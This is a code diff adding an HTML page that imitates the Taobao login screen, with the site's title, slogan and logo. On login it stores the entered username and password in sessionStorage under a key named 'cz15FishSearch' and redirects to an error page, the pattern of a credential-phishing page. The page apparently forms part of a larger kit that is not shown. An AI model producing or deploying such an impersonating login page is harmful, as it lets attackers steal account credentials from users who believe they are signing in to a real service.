@@ -1,0 +1,43 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>淘宝网 - 淘！我喜欢！</title>
+    <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">
+    <link rel="stylesheet" href="../css/reset.css"/>
+    <link rel="stylesheet" href="../css/taobao.css"/>
+</head>
+<body>
+
+<div style="padding: 0 10px; box-sizing: border-box;">
+    <section class="tb-logo">
+        <img src="https://gw.alicdn.com/tfs/TB1p.BGQXXXXXbFXFXXXXXXXXXX-160-160.png" alt="logo">
+    </section>
+
+    <section>
+        <div class="tb-form">
+            <input type="text" placeholder="手机号/邮箱/会员名" id="user">
+        </div>
+        <div class="tb-form">
+            <input type="password" placeholder="请输入密码" id="pwd">
+        </div>
+        <div class="tb-msg">
+            <span>短信验证码登录</span>
+            <span>免费注册</span>
+        </div>
+
+        <a href="javascript:;" class="tb-btn" id="toLogin">登 录</a>
+    </section>
+
+    <script>
+        const user = document.getElementById('user');
+        const pwd = document.getElementById('pwd');
+        const toLogin = document.getElementById('toLogin');
+        toLogin.addEventListener('click', function (ev) {
+            sessionStorage.setItem('cz15FishSearch', JSON.stringify({user:user.value, pwd:pwd.value}));
+            window.location.href = './error.html'
+        })
+    </script>
+</div>
+</body>
+</html>
